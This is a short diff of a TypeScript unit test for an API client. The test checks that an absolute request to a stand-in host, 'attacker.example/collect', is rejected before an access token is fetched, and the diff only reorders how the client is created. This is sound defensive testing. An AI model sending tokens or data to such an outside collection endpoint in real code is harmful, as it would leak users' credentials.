@@ -44,11 +44,10 @@ it('rejects absolute requests before acquiring a token when the API base URL is 
   const adapter: AxiosAdapter = vi.fn()
   const getAccessTokenSilently = vi.fn().mockResolvedValue('access-token')
   axios.defaults.adapter = adapter
+  const client = createApiClient(getAccessTokenSilently, '')
 
-  await expect(Promise.resolve().then(() =>
-    createApiClient(getAccessTokenSilently, '').get(
-      'https://attacker.example/collect',
-    ),
+  await expect(client.get(
+    'https://attacker.example/collect',
   )).rejects.toThrow('API base URL is not configured')
 
   expect(getAccessTokenSilently).not.toHaveBeenCalled()
